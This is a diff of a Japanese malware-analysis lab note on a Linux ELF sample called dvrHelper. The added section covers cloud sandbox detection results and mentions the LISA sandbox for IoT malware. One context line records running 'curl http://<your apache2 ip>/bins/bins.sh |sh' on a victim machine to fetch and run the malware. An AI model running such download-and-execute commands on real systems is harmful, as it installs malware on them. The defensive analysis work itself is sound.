@@ -175,3 +175,16 @@ Victim上で、curl http://<your apache2 ip>/bins/bins.sh |shして、バイナ�
 ![Alt text](image-7.png)
 
 dvrHelperがLinuxの実行ファイルであるELFであり、これは複数のバイナリを
+
+
+## Cloud ServiceのSandboxで検体を実行してみる
+VTでは引っかからないものの、MetaDefenderというやつでしっかりマルウェア判定くらってる。挙動監視みたいなことしてるのかな。
+![Alt text](image-8.png)
+
+検体がLinux向けなのでNoribenもx32dbgも使えず。Cuckooは構築面倒くさくてやめた。
+elfファイルとかIoTデバイスを狙ったマルウェア向けのサンドボックスではLISAというやつが良さそう。
+https://excel.fit.vutbr.cz/submissions/2019/058/58.pdf
+
+
+
+
